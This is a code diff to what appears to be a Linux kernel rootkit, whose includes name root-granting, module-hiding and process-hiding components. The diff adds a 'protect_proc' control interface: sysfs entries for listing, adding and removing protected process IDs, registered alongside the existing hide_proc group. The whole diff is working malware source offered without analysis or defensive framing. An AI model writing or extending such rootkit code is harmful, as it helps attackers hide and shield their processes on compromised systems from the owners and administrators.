@@ -15,6 +15,7 @@
 #include "give_root.h"
 #include "hide_module.h"
 #include "hide_proc.h"
+#include "protect_proc.h"
 
 /*
  * For things about sysfs, see:
@@ -295,6 +296,71 @@ static struct attribute_group hide_proc_attr_group = {
     .attrs = hide_proc_attrs,
 };
 
+/* attribute for protect_proc */
+
+static ssize_t protect_proc_kobj_list(struct kobject *kobj,
+                                   struct kobj_attribute *attr, char *buf) {
+    size_t remain_size = PAGE_SIZE;
+    size_t offset = 0;
+    int count;
+    struct protect_proc_info *pos;
+    list_for_each_entry(pos,&protect_proc_info_list,list) {
+        if (remain_size <= 0)
+            break;
+        count = scnprintf(buf + offset, remain_size, "%d\n", pos->pid);
+        remain_size -= count;
+        offset += count;
+    }
+    return offset;
+}
+
+static ssize_t protect_proc_kobj_add(struct kobject *kobj,
+                                  struct kobj_attribute *attr, const char *buf,
+                                  size_t count) {
+    pid_t pid;
+    int retval;
+
+    retval = kstrtouint(buf, 10, &pid);
+    if (retval)
+        return retval;
+    retval = protect_proc_add(pid);
+    if (retval < 0)
+        return retval;
+    return count;
+}
+
+static ssize_t protect_proc_kobj_del(struct kobject *kobj,
+                                  struct kobj_attribute *attr, const char *buf,
+                                  size_t count) {
+    pid_t pid;
+    int retval;
+
+    retval = kstrtouint(buf, 10, &pid);
+    if (retval)
+        return retval;
+    retval = protect_proc_del(pid);
+    if (retval < 0)
+        return retval;
+    return count;
+}
+
+static struct kobj_attribute protect_proc_kobj_list_attribute =
+    __ATTR(list, 0400, protect_proc_kobj_list, NULL);
+static struct kobj_attribute protect_proc_kobj_add_attribute =
+    __ATTR(add, 0200, NULL, protect_proc_kobj_add);
+static struct kobj_attribute protect_proc_kobj_del_attribute =
+    __ATTR(del, 0200, NULL, protect_proc_kobj_del);
+
+static struct attribute *protect_proc_attrs[] = {
+    &protect_proc_kobj_list_attribute.attr, &protect_proc_kobj_add_attribute.attr,
+    &protect_proc_kobj_del_attribute.attr, NULL};
+
+static struct attribute_group protect_proc_attr_group = {
+    .name = "protect_proc",
+    .attrs = protect_proc_attrs,
+};
+
+
 static struct kobject *module_kobj;
 
 int command_start(void) {
@@ -324,6 +390,10 @@ int command_start(void) {
         goto failed;
     /* create /sys/kernel/${SYS_DIR_NAME}/hide_proc/ */
     retval = sysfs_create_group(module_kobj, &hide_proc_attr_group);
+    if (retval)
+        goto failed;
+    /* create /sys/kernel/${SYS_DIR_NAME}/protect_proc/ */
+    retval = sysfs_create_group(module_kobj, &protect_proc_attr_group);
     if (retval)
         goto failed;
     return retval;
